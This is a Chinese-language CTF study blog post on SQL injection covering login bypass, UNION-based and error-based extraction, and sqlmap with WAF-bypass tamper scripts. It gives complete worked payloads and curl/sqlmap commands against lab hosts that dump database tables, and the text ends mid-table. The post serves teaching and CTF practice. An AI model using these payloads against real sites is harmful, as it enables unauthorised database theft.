---
translationKey: sql-injection-handbook
locale: zh-cn
routeSlug: sql-injection-handbook
title: SQL 注入实战笔记：判定、联合查询、报错与盲注
excerpt: 从判定注入类型讲起，覆盖联合查询、报错、布尔盲注、时间盲注、宽字节、堆叠与二次注入，配九道例题的完整解题过程与 sqlmap 用法。
author: A1right
seoTitle: SQL 注入实战笔记：从判定到九类注入题型
seoDescription: 系统梳理 SQL 注入的判定方法、联合查询、报错注入、布尔与时间盲注、宽字节、堆叠和二次注入，附九道例题的解题过程与 sqlmap 使用要点。
categoryKey: web-security
category: Web 安全
tags:
  - SQL注入
  - sqlmap
  - 盲注
  - 宽字节注入
  - CTF
visibility: public
publishMode: now
publishedAt: 2026-11-07
updatedAt: 2026-11-07
cover: /images/uploads/sql-injection-cover.jpg
coverAlt: 红发动漫少女插画封面
contentType: original
allowRepost: allow-with-attribution
pinned: false
draft: false
---

# 简单介绍：

SQL 注入（SQL Injection）是指攻击者把恶意 SQL 片段混入应用程序的输入参数中，诱使数据库执行非预期 SQL 的攻击方式。核心原因是**程序把用户输入直接拼接到 SQL 语句里**，而没有做参数化或转义。

**简单原理**

- 正常：用户输入用于查询条件。
- 危险：输入被当成 SQL 代码的一部分执行。
- 后果：可能绕过登录、读取/篡改/删除数据，严重时影响数据库服务器。

你可以先思考一下，当你看到一个 ?id=1，你第一件事做什么？作为基础来讲，你可能会想到去简单做个遍历，看看有没有隐藏的网页隐藏的信息可以看到，关于sql注入你可能会想到去加个引号，双引号来试试， 加引号是探测，探测完之后我们必须有判断，否则就变成把网上抄来的 Payload 一条条往上贴。

因此我们要学会的不是记住更多 Payload，而是看到页面反馈就能反推出该走哪条路，以及知道每条路怎么做。

# sql注入之登录绕过

登录认证绕过是 SQL 注入最经典的场景之一。核心一句话：**登录查询把用户名/密码直接拼进 SQL，攻击者输入的内容改变了 SQL 的逻辑条件，使“密码正确”这个条件失效。**

## 1. 正常登录的查询逻辑

很多不安全代码会这样写：

```
SELECT * FROM users
WHERE username = '$username'
  AND password = '$password';
```

程序期望：

- 用户名匹配；
- 密码也匹配；
- 两个条件同时为真才登录成功。

正常输入：

```
username: alice
password: 123456
```

拼接后：

```
SELECT * FROM users
WHERE username = 'alice'
  AND password = '123456';
```

只有数据库里存在 `alice / 123456` 才返回用户记录。

------

## 2. 注入后发生了什么

如果攻击者在用户名输入：

```
' OR '1'='1' --
```

拼接后可能变成：

```
SELECT * FROM users
WHERE username = '' OR '1'='1' --'
  AND password = '任意密码';
```

拆开看：

- `'`：闭合原来的用户名引号；
- `OR '1'='1'`：加入一个永远为真的条件；
- `--`：注释掉后面的密码条件。

于是查询逻辑变成：

```
WHERE username = '' OR 1=1
```

只要表里有用户，就可能返回记录。应用程序如果只判断“查询结果是否非空”，就会认为登录成功。

这也就是我们常说的万能密码

## 例题1：万能密码

![SQL 注入 · 例题1：万能密码](/images/uploads/sql-injection-01.png)

![SQL 注入 · 例题1：万能密码](/images/uploads/sql-injection-02.png)

![SQL 注入 · 例题1：万能密码](/images/uploads/sql-injection-03.png)

成功得到flag

题目本身是最经典的注入形态，考点就一个：**用户输入直接拼进 SQL 字符串**。`admin'#` 之所以有效，是因为单引号把 `username='...'` 这个字面量提前关掉，`#` 又把后面的密码校验整段注释掉，认证逻辑从"用户名和密码都匹配"退化成"用户名存在"。

# 一、判定先行：注入类型决策树

> 拿到疑似注入点，先按页面反馈、数据库能力、数据流向依次提问，
>
> 再决定技术路线。

## 先判断字符型还是数字型

SQL 注入做题时，判断“字符型/数字型”本质是判断：**参数在 SQL 里被什么包裹、你能不能直接改变 SQL 结构。**

它决定三件事：

1. **闭合方式**：需不需要先补一个引号、括号；
2. **payload 怎么构造**：数字型可直接 `and 1=1`，字符型通常要 `' and 1=1 --`；
3. **注释符要不要用**：字符型经常要注释掉后面残留的引号。

判断错，payload 就会语法错误或逻辑不成立。

## 两者的核心区别

假设后端 SQL：

**数字型**

```
SELECT * FROM users WHERE id = $id;
```

参数没有引号包裹，直接参与比较。

**字符型**

```
SELECT * FROM users WHERE username = '$name';
```

参数被单引号（或双引号）包裹。

> 还有“搜索型/模糊查询型”：`LIKE '%$kw%'`，闭合时通常要补 `%'`，本质仍是字符型的一种变体。

## 逻辑测试 `and 1=1` / `and 1=2`

在参数后追加逻辑条件，观察页面是否变化。

**数字型**可以直接：

```
id=1 and 1=1   → 正常
id=1 and 1=2   → 无结果/异常
```

如果两者表现不同，说明 `and` 被当成 SQL 执行了，且参数可直接拼入，偏向数字型。

**字符型**需要先闭合：

```
name=admin' and '1'='1   → 正常
name=admin' and '1'='2   → 无结果
```

如果加引号闭合后逻辑才生效，说明是字符型。

判断要点：**`and 1=1` 和 `and 1=2` 返回结果不同，才说明注入点可控。**

## 算术运算测试（区分数字型很有效）

数字型参数可以直接做算术：

```
id=2-1    → 如果返回 id=1 的内容，说明参数被当数字运算 ⇒ 数字型
id=1+1    → 返回 id=2 的内容 ⇒ 数字型
```

字符型里 `'2-1'` 只是字符串，不会变成 `1`，页面通常不会等价于 `id=1`。

这个方法对“无报错、回显正常”的数字型站点很好用。

# 二、常见的注入类型以及sqlmap的使用

## 联合查询注入

> 联合查询注入是**有回显**场景下最直接、最好用的一类 SQL 注入。核心思路：利用 SQL 的 `UNION SELECT`，把攻击者构造的查询结果**拼接到原查询结果后面**，让数据库把额外数据返回并显示在页面上。
>

## 一、简单介绍：

### 1. 原理：UNION 是什么

`UNION` 用于合并两个或多个 `SELECT` 结果集：

```
SELECT 列1, 列2 FROM 表A
UNION
SELECT 列1, 列2 FROM 表B;
```

规则很关键：

1. **列数必须相同**；
2. **对应列的数据类型要兼容**；
3. 结果默认去重（`UNION ALL` 不去重）。

注入点能执行 `UNION SELECT` 时，攻击者就能用自己的 `SELECT` 去查数据库元信息甚至业务数据，并显示在页面回显位上。

### 2. 前提条件

联合查询注入不是万能，需要满足：

- 参数**存在注入**且未被过滤 `UNION/SELECT`；
- 原查询**有回显**（页面会显示查询结果）；
- 能确定**原查询列数**；
- 能确定**哪些列会显示在页面上**（回显位）；
- 对应列**数据类型兼容**。

如果页面无回显，就要转盲注/报错注入，不适用联合查询。

## 例题2：联合查询注入

![SQL 注入 · 例题2：联合查询注入](/images/uploads/sql-injection-04.png)

![SQL 注入 · 例题2：联合查询注入](/images/uploads/sql-injection-05.png)

### 判断闭合方式

像这样的题目，我们可以先去简单爆破一下

> 2026001 and 1=1 --  2026001 and 1=2 --  2026001' and 1=1 --  2026001' and 1=2 --  2026001" and 1=1 --  2026001" and 1=2 --  2026001) and 1=1 --  2026001) and 1=2 --  2026001') and 1=1 --  2026001') and 1=2 --  2026001") and 1=1 --  2026001") and 1=2 --  2026001)) and 1=1 --  2026001)) and 1=2 --  2026001')) and 1=1 --  2026001')) and 1=2 --  2026001")) and 1=1 --  2026001")) and 1=2 --  2026001))) and 1=1 --  2026001))) and 1=2 --  2026001'))) and 1=1 --  2026001'))) and 1=2 --  2026001"))) and 1=1 --  2026001"))) and 1=2 --

![SQL 注入 · 2026001 and 1=1 -- 2026001 and 1=2](/images/uploads/sql-injection-06.png)

![SQL 注入 · 2026001 and 1=1 -- 2026001 and 1=2](/images/uploads/sql-injection-07.png)

我们来观察长度的变化，不一样的往往就是我们需要去注意的地方

`and 1=1` 成功、`and 1=2` 失败，这是**布尔条件的直接证据**：用户输入进入了 SQL 表达式并参与求值。而加单引号反而全崩，说明原始 SQL 里 `id` 位置**没有引号**，是纯数字拼接

这里也就能看出来是数字型

接着就要去判断列数

### 判断列数：

判断列数，是 4 列。（4正常5报错）

```sql
2026001 order by 3#
2026001 order by 4#
2026001 order by 5#
```

#### 1. 后端 SQL 大概长什么样

参数 `2026001` 没有加引号闭合，说明大概率是**数字型**注入点。后端可能是：

```
SELECT id, title, content, author
FROM news
WHERE id = 2026001
ORDER BY ???   -- 原本可能没有，或者有别的尾部
LIMIT 0,1;
```

当你输入 `2026001 order by 4#`，拼接后可能变成：

```
SELECT id, title, content, author
FROM news
WHERE id = 2026001
ORDER BY 4
# LIMIT 0,1;
```

`#` 是 MySQL 的注释符，把后面残留的 `LIMIT ...` 等语法注释掉，保证语句完整不报错。

------

#### 2. ORDER BY 后面跟数字是什么意思

SQL 里 `ORDER BY` 有两种写法：

```
ORDER BY title        -- 按列名排序
ORDER BY 2            -- 按结果集的第 2 列排序
```

关键点：**`ORDER BY N` 里的 N 是“结果集的第 N 列”的序号，不是表里的第 N 列，也不是值 N。**

数据库会检查：

- 如果 N ≤ 结果集列数：合法，按第 N 列排序；
- 如果 N > 结果集列数：找不到这一列，报错。

MySQL 典型报错：

```
Unknown column '5' in 'order clause'
```

------

#### 3. 为什么 4 正常、5 报错

假设原查询返回 4 列：`id, title, content, author`。

| payload       | 实际语义                   | 结果                      |
| :------------ | :------------------------- | :------------------------ |
| `order by 3#` | 按第 3 列 `content` 排序   | 合法，正常                |
| `order by 4#` | 按第 4 列 `author` 排序    | 合法，正常                |
| `order by 5#` | 按第 5 列排序，但只有 4 列 | 报错 `Unknown column '5'` |

所以：

```
最后一个不报错的数字 = 结果集列数
第一个报错的数字     = 列数 + 1
```

你的情况就是 **4 列**。

这个就像我们常用的表格，我们各列来排序

这一步是在为 UNION 做准备——**UNION 要求前后两个查询列数完全一致**，否则直接语法错误。用 ORDER BY 递增是最稳的列数探测法，因为 `ORDER BY 5` 引用不存在的列名必然报错

### 判断回显位

判断回显，都是回显位。

```sql
-1 union select 1,2,3,4#
```

你已经确定原查询是 **4 列**，现在这一步的目的是：**找出哪几列的结果会真正显示在页面上**，也就是“回显位”。你说“都是回显位”，意思是 1、2、3、4 四个数字在页面上都出现了，说明 4 列全部有回显。

### 1. 这一步的前提

前面已经完成：

```
2026001 order by 4#   → 正常
2026001 order by 5#   → 报错
```

结论：原查询返回 **4 列**。后端 SQL 大概长这样：

```
SELECT id, title, content, author
FROM news
WHERE id = 2026001
LIMIT 0,1;
```

现在要构造 `UNION SELECT`，列数必须也是 4，否则报错：

```
2026001 union select 1,2,3,4#
```

拼接后：

```
SELECT id, title, content, author
FROM news
WHERE id = 2026001
UNION
SELECT 1,2,3,4
# LIMIT 0,1;
```

`#` 注释掉尾部残留。

------

### 2. 为什么 UNION 要求列数相同

`UNION` 是**按列位置纵向合并**两个结果集：

```
SELECT a,b,c,d FROM 表A
UNION
SELECT 1,2,3,4;
```

合并后的结果集结构是：

```
列1  列2  列3  列4
a    b    c    d     ← 原查询的行
1    2    3    4     ← UNION 追加的行
```

规则：

1. **列数必须相同**，否则报错；
2. **对应列类型要兼容**，比如第 1 列是数字，你放字符串可能报错；
3. 默认去重，`UNION ALL` 不去重。

所以列数判断是联合查询注入的前置条件。

### 你看到的 `2026001` 只是“拼进去的碎片”，不是完整 SQL

你的疑惑很关键：你看到的是

```
2026001 union select 1,2,3,4#
```

前面只有一个 `2026001`，看起来不像 `SELECT a,b,c,d FROM 表A` 那样完整，怎么和后面的 `SELECT 1,2,3,4` 对应？

原因是：**你输入的内容不是一条独立 SQL，而是被拼接到后端早已写好的 SQL 语句中间。** 完整的 SELECT 在应用代码里，不在你的输入框里。

------

#### 1. 后端原本的 SQL

假设新闻详情页的代码大概这样写：

```
id = request.GET["id"]
sql = "SELECT id, title, content, author FROM news WHERE id = " + id
```

正常访问 `id=2026001` 时，实际执行：

```
SELECT id, title, content, author
FROM news
WHERE id = 2026001;
```

这里：

- `SELECT id, title, content, author FROM news WHERE id =` 是**应用写死的模板**；
- `2026001` 是**你输入的值**，被拼到最后。

完整语句是一个 4 列的 SELECT。

------

#### 2. 你输入 payload 后，拼接结果是什么

你输入：

```
2026001 union select 1,2,3,4#
```

应用拼接后，实际执行的是：

```
SELECT id, title, content, author
FROM news
WHERE id = 2026001
UNION
SELECT 1,2,3,4
# ;
```

现在再看：

```
SELECT id, title, content, author FROM news WHERE id = 2026001
UNION
SELECT 1,2,3,4
```

左边是**完整的原 SELECT，4 列**；右边是你追加的 **SELECT，也是 4 列**。这就对应上了。

你看到的 `2026001` 只是左边 SELECT 的 `WHERE id =` 后面的**条件值**，不是整条 SELECT。左边完整的 SELECT 是应用代码提供的，你只负责往里面“插”了一段。

------

#### 3. 为什么用 `-1` 而不是 `1`

这是关键点。

如果写：

```
2026001 union select 1,2,3,4#
```

后端变成：

```
SELECT id,title,content,author FROM news WHERE id = 2026001
UNION
SELECT 1,2,3,4;
```

结果集可能有两行：

```
第一行：id=2026001 的那篇新闻（真实数据）
第二行：1,2,3,4（你的测试数据）
```

页面通常只显示第一行，或者真实数据把测试数据挤掉，你**看不到 1、2、3、4**，就误以为没有回显。

改成 `-1`：

```
SELECT ... FROM news WHERE id = -1
UNION
SELECT 1,2,3,4;
```

`id = -1` 通常查不到任何记录（假设 id 是正数自增），原查询返回**空结果**。于是 UNION 后的结果只剩你构造的那一行：

```
1    2    3    4
```

页面上就能干净地看到 1、2、3、4 分别出现在哪些位置。

> 所以 `-1` 的作用是：**让原查询失效，只显示 UNION 追加的测试行。** 也可以用 `0`、`-999`、`999999` 等不存在的 id，只要原查询查不到数据即可。

![SQL 注入 · 所以 -1 的作用是：让原查询失效，只显示 UNION 追加的测试行](/images/uploads/sql-injection-08.png)

全都是回显的位置

### 拖库

### 库名、版本、用户

```
id=0 union select 1,database(),3,4      → user
id=0 union select 1,version(),3,4       → 10.4.13-MariaDB
id=0 union select 1,user(),3,4          → ctf@localhost
```

`database()` 拿到当前库 `user`，`version()` 确认 MariaDB，`user()` 是权限受限的 `ctf@localhost`。这三个信息决定了后面 information_schema 怎么查。

![SQL 注入 · database() 拿到当前库 user，version() 确认](/images/uploads/sql-injection-09.png)

#### 第 1 步：提取库名

id=0 union select 1,database(),3,4 

#### 第 2 步：把 `database()` 换成"查表名"

```
http://docker.qingcen.net:31667/?id=0%20union%20select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema=database()%23
```

`database()` 返回的是**一个单值**（库名 `user`），它回答的是"我在哪个库"。

但这一步要问的是"这个库里有哪些表"——答案**天然是多行**（flag、students 两行）。一个多行的结果集塞不进一个回显位（页面只有一个 `<span>`）。

**为什么必须套 `group_concat`**

`where` 匹配到的是**两行数据**，但 PHP 用 `mysqli_fetch_assoc()` **只取第一行**，第二行直接丢弃。页面永远不会显示第二行，因为模板里就一个回显位。`group_concat()` 做的事：**把同一个结果集里某一列的所有行值，用逗号拼成一个字符串**。两行 → 一个值 → 塞进一个回显位。

**为什么原来的语句不需要 FROM**

上一步的 `database()` 是个**函数**，不需要从任何表里取数据，所以 `select 1,database(),3,4` 就够。

但 `table_name` **是一个列名**。SQL 里列名必须属于某张表，你得告诉数据库"去哪个表找这一列"。

**为什么选 `information_schema.tables`**

`information_schema` 是 MySQL/MariaDB **内置的元数据库**，不属于任何业务库，专门记录"服务器上有什么"：

| 表         | 记录什么       | 关键列                                      |
| :--------- | :------------- | :------------------------------------------ |
| `tables`   | 所有库的所有表 | `table_schema`(库名)、`table_name`(表名)    |
| `columns`  | 所有表的列     | `table_schema`、`table_name`、`column_name` |
| `schemata` | 所有库         | `schema_name`                               |

`tables` 表里的 `table_name` 列，存的就是**表名字符串**。所以 `select table_name from information_schema.tables` 的语义是："把数据库里所有表的名字列出来"。

这是拖库的必经入口——不知道表名，就没法 `select ... from 某表`。

**新增 `where table_schema=database()`**

为什么必须过滤

`information_schema.tables` 里不只有你的业务表，还有**服务器上所有库**的表，包括 `information_schema` 系统库自己的几十张元数据表。

但 `database()` 有实际好处：

1. **payload 可复用**。同一套模板换到别的实例、别的库名，不用改。你这题 41233 和 31667 库名都是 `user` 所以看不出差别，但换个题库名叫 `cms` 就得返工。
2. **少一次猜测**。硬编码意味着你必须先知道库名，而 `database()` 是数据库自己告诉你的。

`table_schema` 在 MySQL 里就是**库名的同义词**（schema = database）。

#### 第 3 步：把数据源换成 `columns`

```
http://docker.qingcen.net:31667/?id=0%20union%20select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name='flag'%23
```

#### 第 4 步：把元数据查询换成真实取数

```
http://docker.qingcen.net:31667/?id=0%20union%20select%201,group_concat(secret),3,4%20from%20flag%23
```

**变化一：`from information_schema.columns` → `from flag`**

`information_schema.columns` 是**系统目录**，它记录的是"每张表有哪些列"，本身不存业务数据。你在里面翻到的 `column_name='secret'` 只是**列的名字**，不是 flag 的值。

`flag` 是**真实业务表**，`secret` 是它的一个数据列，里面存的就是 flag 字符串。

**变化二：`column_name` → `secret`**

`column_name` 是 `information_schema.columns` 这张系统表的字段，它的值是"列的名字"。

`secret` 是 `flag` 表的字段，它的值是"flag 本身"。

上一步的结果 `id,secret` 就是这一步的**操作指南**——它告诉你"目标表里的字段叫 `secret`"，你把这个名字直接填进 `select` 就行。

数据源唯一，不存在"混入其他表"的问题，自然不需要再过滤。WHERE 的作用是"从大集合里筛出子集"，而这里的数据源已经是那个精确的子集了。

SQL **有三层命名空间**

数据库 (database/schema)
   └── 表 (table)
          └── 列 (column)

`FROM` 这个关键字要求后面跟的东西必须能**提供"行"**——也就是一个结果集。三层里只有**表**（以及视图、子查询）满足这个条件

## 报错注入：

> 报错注入的定位很清晰：**它是在页面没有正常“回显位”来展示 UNION 查询结果，但会把数据库的报错信息显示在页面上时，所使用的一种注入手法**。
>
> 它的思路和之前讨论的联合查询不同，核心是：**刻意构造一个会触发数据库报错的查询，并把想获取的数据（如库名、表名、字段值）嵌入到报错信息里，让数据库在“报错”的时候，顺便把数据“说”出来**。

### 前提条件：必须有“报错回显”

报错注入能成立，需要同时满足两个条件：

1. **数据库的详细错误信息被直接显示在了页面上**（没有做统一的错误屏蔽）。
2. **后端没有过滤那些具备“报错能力”的特殊函数**（比如 MySQL 的 `extractvalue`、`updatexml` 等）。

如果页面关闭了报错显示，或者把错误统一处理成了“系统繁忙”之类的提示，报错注入就无法直接使用，需要考虑盲注。

#### `extractvalue()` 与 `updatexml()`：利用 XPath 语法报错

这两个函数是 MySQL 5.1.5 之后引入的 XML 处理函数。它们的第二个参数要求必须是一个**合法的 XPath 格式字符串**。如果传入的格式不合法，函数就会报错，并且**错误信息里会包含你传入的那个非法字符串**。

`extractvalue` 的用法：

```
extractvalue( XML文档, XPath表达式 )
```

正常调用时，第二个参数应该像 `/root/a` 这种路径格式。攻击者会构造一个以 `~`（或 `:`、`#` 等非法字符）开头的字符串，让 XPath 解析失败：

```
id=1 and extractvalue(1, concat(0x7e, (select database())))
```

| 部分        | 作用                                           |
| ----------- | ---------------------------------------------- |
| 1           | 随便一个 XML 文档（数字 1 会被当文本）         |
| 0x7e        | ~ 符号，XPath 的非法起始字符，用来稳定触发报错 |
| database()  | 要偷的数据                                     |
| concat(...) | 把 ~ 和数据拼成一个非法 XPath                  |

拼接后，`extractvalue` 收到的第二个参数类似 `~security`（`~` 是 `0x7e` 的十六进制）。因为 `~` 不是合法的 XPath 起始字符，函数报错：

```
XPATH syntax error: '~security'
```

这样，当前数据库名 `security` 就随着报错信息出现在了页面上。

`updatexml` 同理，它的第二个参数也需要合法的 XPath：

```
updatexml( XML文档, XPath表达式, 新值 )
```

注入 payload 为：

```
id=1 and updatexml(1, concat(0x7e, (select database())), 1)
```

同样会因为第二个参数 `~security` 格式非法而报错，并带出库名。

**需要注意的限制**：这类函数报错回显的字符串长度通常有限（例如 `extractvalue` 最多显示约 32 个字符）。如果要获取较长的数据（比如多个表名），需要用 `substr()` 分段读取，或者配合 `limit` 逐条获取。

#### 防止数据被"吃掉"——这才是 concat 的真正价值

这是实测里最反直觉的一点。我用三种写法对比：

#### 写法 A：不用 concat，直接把数据当 XPath

```
extractvalue(1, (select secret from flag))
→ XPATH syntax error: '{220338c8-40e8-45a6-99f6-f61a...'
```

**开头的 `flag` 四个字母不见了！**

原因：XPath 里 `flag` 是一个**合法的节点名**（元素名），解析器会先把它当作"查找名为 flag 的子节点"正常消费掉，走到 `{` 才发现非法。报错只能显示"从出错位置开始"的内容，所以 `flag` 丢了。

拿到残缺的数据，你会误以为 secret 的值是 `{220338c8-...}`，拼出来的 flag 是错的。

`concat` 在报错注入里作用：**把非法前缀和数据拼成一个字符串**、**保证数据一个字符都不被 XPath 解析器吃掉**、**用 `~` 标出数据的起止边界**。

### 例题3：报错注入

![SQL 注入 · 例题3：报错注入](/images/uploads/sql-injection-10.png)

继续试单引号的各种变体，全部 `Login failed`：

```
admin'            → Login failed
admin' --         → Login failed
admin' or '1'='1  → Login failed
```

全是"正常失败"，没有一个 SQL 错误。这几乎可以断定：**参数不是单引号包裹的**。

于是换双引号试：

```
u=[admin"] p=[x]  →  SQL Error: ... near 'x")' at line 1
```

**报错了！** 这就是突破口。

![SQL 注入 · 报错了！ 这就是突破口。](/images/uploads/sql-injection-11.png)

SQL 报错是最好的老师，它把你拼出来的语句原样告诉你哪里错了。

```
http://docker.qingcen.net:45043/?username=admin&password=x%22)%20union%20select%201,(select%20secret%20from%20flag),3,4%20--%20
```

爆库名

```
http://docker.qingcen.net:45043/?username=admin%22)%20and%20extractvalue(1,concat(0x7e,database()))%20%23&password=x
```

表名

```
http://docker.qingcen.net:45043/?username=admin%22)%20and%20extractvalue(1,concat(0x7e,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database())))%20%23&password=x
```

![SQL 注入 · http://docker.qingcen.net:45043/?u](/images/uploads/sql-injection-12.png)

列名

```
http://docker.qingcen.net:45043/?username=admin%22)%20and%20extractvalue(1,concat(0x7e,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27flag%27)))%20%23&password=x
```

![SQL 注入 · http://docker.qingcen.net:45043/?u](/images/uploads/sql-injection-13.png)

取数据

```
http://docker.qingcen.net:45043/?username=admin%22)%20and%20extractvalue(1,concat(0x7e,(select%20substr(secret,1,30)%20from%20flag)))%20%23&password=x
```

![SQL 注入 · http://docker.qingcen.net:45043/?u](/images/uploads/sql-injection-14.png)

```
http://docker.qingcen.net:45043/?username=admin%22)%20and%20extractvalue(1,concat(0x7e,(select%20substr(secret,31,30)%20from%20flag)))%20%23&password=x
```

![SQL 注入 · http://docker.qingcen.net:45043/?u](/images/uploads/sql-injection-15.png)

成功得到完整的flag

## sqlmap的使用

sqlmap 是一款开源的自动化 SQL 注入检测与利用工具，支持 MySQL、Oracle、PostgreSQL 等十余种数据库。它能自动识别注入类型、指纹识别数据库，并枚举或导出数据，是渗透测试中确认和利用 SQL 注入漏洞的“加速器”。

**基础检测命令**
最基本的用法是指定一个可能存在的注入点 URL，让 sqlmap 自动进行检测。

```
sqlmap -u "http://example.com/login.php?id=1" --batch
```

- **`-u`**：指定目标 URL（GET 请求）。
- **`--batch`**：启用自动应答模式，所有交互问题都使用默认答案，适合自动化脚本。

**处理复杂请求**
对于需要登录或复杂交互的现代 Web 应用，直接扫描 URL 往往无效。更可靠的方式是从 Burp Suite 等代理工具中**捕获一个有效的、已认证的请求**，保存为文件，然后让 sqlmap 加载它。这能确保测试完全复现应用的认证状态和请求头。

```
sqlmap -r request.txt --batch
```

你也可以直接在命令行中构造 POST 或 Cookie 请求：

```
# POST 请求
sqlmap -u "http://example.com/login" --data="user=admin&pass=test" --batch
# Cookie 注入
sqlmap -u "http://example.com/page" --cookie="id=1*" --batch
```

在参数值后加 `*` 可以明确指定 sqlmap 在该位置进行注入测试。

sqlmap 通常遵循一个由浅入深的枚举流程：先确认漏洞，再逐步获取数据库结构，最后提取数据。

| 目标                 | 核心命令                                     | 说明                                                    |
| :------------------- | :------------------------------------------- | :------------------------------------------------------ |
| **获取所有数据库**   | `--dbs`                                      | 列出目标 DBMS 中的所有数据库名称                        |
| **获取指定库的表**   | `-D dbname --tables`                         | 列出 `dbname` 数据库中的所有表                          |
| **获取指定表的列**   | `-D dbname -T tablename --columns`           | 列出指定表的列名及数据类型                              |
| **导出指定列的数据** | `-D dbname -T tablename -C col1,col2 --dump` | 导出 `col1` 和 `col2` 列的数据，结果可保存为 CSV 等格式 |

**关键控制参数**

- **`--level` (1-5, 默认1)**：控制测试的广度。级别越高，测试的参数越多（例如，Level 3 会测试 User-Agent、Cookie 等 HTTP 头）。
- **`--risk` (1-3, 默认1)**：控制测试的侵入性。Risk 3 会包含可能修改数据的 OR 型 payload，仅在必要时使用。
- **`--technique`**：精确指定注入技术，避免不必要的请求。常用值：`B` (布尔盲注), `E` (报错), `U` (联合查询), `S` (堆叠查询), `T` (时间盲注),。

**1. 绕过 WAF / 过滤器 (`--tamper`)**
当目标存在 Web 应用防火墙（WAF）时，sqlmap 的常规 payload 可能被拦截。`--tamper` 参数可以加载脚本，在发送前对 payload 进行混淆或编码。可以同时使用多个脚本（用逗号分隔）。

```
sqlmap -u "http://target/page?id=1" --tamper=space2comment,between --random-agent
```

常用 Tamper 脚本效果：

- **`space2comment`**：将空格替换为 `/**/`。
- **`between`**：将 `>` 替换为 `BETWEEN`。
- **`randomcase`**：随机化 SQL 关键字的大小写。
- **`charencode`**：对 payload 进行 URL 编码。

不加星号时，sqlmap 会按照自己的逻辑去**自动探测**请求中所有它认为可能存在注入的参数（GET、POST、Cookie 等）。在大多数标准场景下，这已经足够了。

但星号 `*` 的存在，是为了解决 **sqlmap 自动探测不到或探测不准确**的问题。当你明确知道注入点在哪里，或者目标使用了 `mod_rewrite` 等 URL 重写技术导致参数不在传统的查询字符串中时，就需要用到它。

### 例题4：sqlmap的使用之联合查询注入

![SQL 注入 · 例题4：sqlmap的使用之联合查询注入](/images/uploads/sql-injection-16.png)

```
T="http://docker.qingcen.net:46434/"

# 1. 确认注入
curl -s "$T?username=admin%27%23&password=x"

# 2. 列数
curl -s "$T?username=admin%27%20order%20by%204%23&password=x"

# 3. 回显位
curl -s "$T?username=zz%27%20union%20select%20%27A%27,%27B%27,%27C%27,%27D%27%23&password=x"

# 4. 表名
curl -s --get --data-urlencode "username=zz' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()#" --data-urlencode "password=x" "$T"

# 5. 列名
curl -s --get --data-urlencode "username=zz' union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=database() and table_name='flag'#" --data-urlencode "password=x" "$T"

# 6. flag
curl -s --get --data-urlencode "username=zz' union select 1,secret,3,4 from flag#" --data-urlencode "password=x" "$T"
```

但是我们要用sqlmap跑

```
# 1. 看 user 库有哪些表
python sqlmap.py -u "URL" --batch -D user --tables

# 2. 看 flag 表有哪些列
python sqlmap.py -u "URL" --batch -D user -T flag --columns

# 3. 只 dump secret 这一列（更快）
python sqlmap.py -u "URL" --batch -D user -T flag -C secret --dump
```

关于为什么要写%23而不是#，原因是因为#在url中`#` 后面的部分叫 **fragment（片段标识符）**，它的用途是让浏览器在页面内跳转到锚点，比如：

```
https://example.com/doc.html#section-3
```

这个 `#section-3` **只在浏览器本地使用**，HTTP 协议规定它**不属于请求内容**，所以浏览器（以及 curl）构造请求时会把它连同后面的一切截掉。

这就是为什么你写 `?username=admin'#&password=x` 时，服务器收到的只有 `?username=admin'`——`&password=x` 被当成了 fragment 的一部分，直接丢弃。

`%23` 是 `#` 的 **percent-encoding（百分号编码）**

当 `#` 以 `%23` 的形式出现时，它不再有"fragment 分隔符"的特殊含义，就是一个**普通的数据字节**。浏览器和服务器都按字面处理，完整地放进请求里。

## 接收端的解码链路

服务器收到 `%23` 后，PHP 会自动做 URL 解码：

```
你发:     /?username=admin'%23&password=x
传输中:   admin'%23
PHP 解码: $_GET['username'] = "admin'#"
拼进 SQL: SELECT * FROM flag WHERE name='admin'#' AND passwd='x'
                                       ↑
                                  这才是真正的注释符
```

关键点：**`#` 作为注释符的语义是在数据库层面生效的，而不是在传输层面**。URL 编码只负责把字符安全地送到 PHP，PHP 解码后 SQL 解析器才把 `#` 识别为注释。

如果直接发裸 `#`，它连 PHP 都到不了，更谈不上注释。

ok，我们回归正题

![SQL 注入 · ok，我们回归正题](/images/uploads/sql-injection-17.png)

不难发现是'闭合

![SQL 注入 · 不难发现是'闭合](/images/uploads/sql-injection-18.png)

![SQL 注入 · 不难发现是'闭合](/images/uploads/sql-injection-19.png)

很快就跑出来了数据库名

接着提取表名

![SQL 注入 · 很快就跑出来了数据库名](/images/uploads/sql-injection-20.png)

![SQL 注入 · 很快就跑出来了数据库名](/images/uploads/sql-injection-21.png)

跑库名

![SQL 注入 · 很快就跑出来了数据库名](/images/uploads/sql-injection-22.png)

![SQL 注入 · 很快就跑出来了数据库名](/images/uploads/sql-injection-23.png)

把secret的数据dump下来

![SQL 注入 · 把secret的数据dump下来](/images/uploads/sql-injection-24.png)

![SQL 注入 · 把secret的数据dump下来](/images/uploads/sql-injection-25.png)

成功得到flag

### 关于sqlmap的缓存

sqlmap 的“缓存”本质上是它为了支持断点续传和避免重复劳动而创建的**会话文件（`session.sqlite`）**，它记录了目标信息、注入点、数据库指纹乃至已提取的数据结果。清理它的核心原因在于，这份“记忆”有时会**过时或出错**，继续使用反而会污染测试结果。

sqlmap 缓存的初衷是提升效率，但在测试环境发生变化时，旧缓存会带来以下问题：

- **导致误报或漏报**：这是最常见的原因。如果目标应用或数据库结构已改变，sqlmap 仍基于旧缓存信息（如数据库名、表结构）进行判断，就可能得出错误结论。
- **数据滞后**：缓存中的查询结果是“历史快照”。当你需要获取**实时数据**（如验证漏洞修复后的状态，或监控动态变化的数据）时，旧数据会造成误导。
- **状态损坏或冲突**：会话文件可能因异常中断而损坏（如报告 `disk I/O error`），或在新版本 sqlmap 中因数据模型变更而导致无法正确加载旧缓存，从而引发各种运行错误。
- **占用磁盘空间**：长期未清理的 `output/` 目录会不断累积，可能占用可观的磁盘空间。

根据你想要达到的目的，清理的“粒度”也不同。sqlmap 提供了从轻到重的几种控制方式，你可以根据场景选择：

| 场景                                                 | 推荐清理方式                  | 理由与效果                                                   |
